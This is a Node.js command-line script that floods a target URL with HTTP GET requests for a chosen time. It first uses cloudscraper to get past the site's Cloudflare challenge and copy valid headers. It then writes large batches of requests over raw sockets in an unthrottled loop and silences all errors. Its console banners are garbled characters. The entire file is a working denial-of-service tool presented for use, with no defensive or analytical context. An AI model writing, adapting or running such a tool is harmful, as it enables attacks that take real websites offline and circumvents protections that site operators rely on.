require('events').EventEmitter.defaultMaxListeners = 0
const CloudScraper = require('cloudscraper'),
    path = require('path'),
    url = require('url');

if (process.argv.length !== 5) {
    console.log("Usage: node ${path.basename(__filename)} <url> <time> <1700>");
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    host = url.parse(target).host;

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {
            if (error) {
                //If cloudscraper return an error will retry
                console.log(`ERROR`);
                return start();
            }
            let headers = '' ;
            Object.keys(response.request.headers).forEach(function (i, e) {
                //The following headers might break the request
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });

            console.log(headers);
            resolve(headers);
        });
    });
}

function send_req(headers) {
    const net = require('net'),
        client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(
            `GET ${target} HTTP/1.2\r\n` +
            headers + '\r\n\r\n'
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    });
}

let init = function () {
    getHeaders().then(function (result) {
        console.log(`
                浜様?様様?様様?様??様??刺融
                塞融塞刺産瓢瓢塞融塞融査塞?
                査頂?失哉?失哉?債査債??伴?
                哉夕債査陳頂債哉夕査追?瓢?
                塞融債査陳頂債塞融哉夕査哉?
                伴槌篠伴陳槌篠伴槌?様??屡夕
        `);
        setInterval(() => {
            send_req(result);
        });
    });
};

setTimeout(() => {
    console.log(`
                    浜様?融追?様融
                    塞様?哉産?刺産
                    哉様?瓢伴査査?
                    塞様?哉産査査?
                    哉様?債査?屡失
                    藩様?篠藩?様夕
    `);
    process.exit(0)
}, time * 1000);

init();

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});